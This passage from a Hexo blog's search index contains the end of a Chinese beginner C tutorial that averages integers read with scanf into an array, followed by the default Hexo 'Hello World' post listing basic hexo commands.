<h3 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h3><p>再更进一步，可以思考设计一个更贴近实际作用地程序，即scanf输入所需计算的数（个数不限）而得到平均值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">double getAverage(int *arr, int size);</span><br><span class="line"> </span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">	int i,a[999],n&#x3D;0;</span><br><span class="line">    for(i&#x3D;0;;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">        n++;       </span><br><span class="line">        if(getchar()&#x3D;&#x3D;&#39;\n&#39;)break; </span><br><span class="line">    &#125;</span><br><span class="line">    double avg;</span><br><span class="line">	avg &#x3D; getAverage(a,n) ;</span><br><span class="line"> </span><br><span class="line">    printf(&quot;Average value is: %f\n&quot;, avg );</span><br><span class="line">   </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double getAverage(int *arr, int size)</span><br><span class="line">&#123;</span><br><span class="line">  int    i, sum &#x3D; 0;      </span><br><span class="line">  double avg;          </span><br><span class="line"> </span><br><span class="line">  for (i &#x3D; 0; i &lt; size; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    sum +&#x3D; arr[i];</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  avg &#x3D; (double)sum &#x2F; size;</span><br><span class="line"> </span><br><span class="line">  return avg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>函数</tag>
        <tag>指针</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/01/01/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>guide</category>
      </categories>
      <tags>
        <tag>guide</tag>
      </tags>
  </entry>
</search>
